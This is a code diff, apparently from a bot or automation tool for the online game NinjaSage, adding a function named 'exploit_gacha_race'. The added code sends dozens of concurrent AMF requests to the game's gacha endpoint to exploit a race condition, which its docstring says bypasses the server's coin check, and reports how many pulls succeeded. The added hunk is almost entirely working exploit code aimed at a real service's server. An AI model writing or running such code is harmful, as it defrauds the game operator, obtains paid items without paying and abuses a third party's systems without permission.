@@ -17,6 +17,27 @@ async def auto_daily_gacha(client: NinjaSageClient, sessionkey: str, char_id: in
     else:
         return f"Failed to check gacha: {res}"
 
+async def exploit_gacha_race(client: NinjaSageClient, sessionkey: str, char_id: int, coin_type: str, spam_count: int = 50):
+    """
+    Race condition exploit: Send multiple AMF requests concurrently.
+    Used for bypassing the coin check when server fails to lock database rows properly.
+    """
+    try:
+        # Build tasks to run concurrently
+        tasks = []
+        for _ in range(spam_count):
+            tasks.append(client.send_amf_request("mGbT7HiV6WeVOUXp.Ckpdt4SSQ1wF", [sessionkey, char_id, coin_type, 1]))
+            
+        # Fire all requests at the exact same time
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # Count successes
+        success_count = sum(1 for r in results if isinstance(r, dict) and r.get('status') == 1)
+        
+        return f"[Gacha Exploit] Fired {spam_count}x {coin_type}. Success: {success_count}/{spam_count}. Results: {results[:2]}..."
+    except Exception as e:
+        return f"[Gacha Exploit] Failed: {e}"
+
 async def auto_giveaway(client: NinjaSageClient, sessionkey: str, char_id: int):
     res = await client.send_amf_request("be9WkVbJZYaRo69c.C3VahnT6Jydb", [char_id, sessionkey])
     logs = []
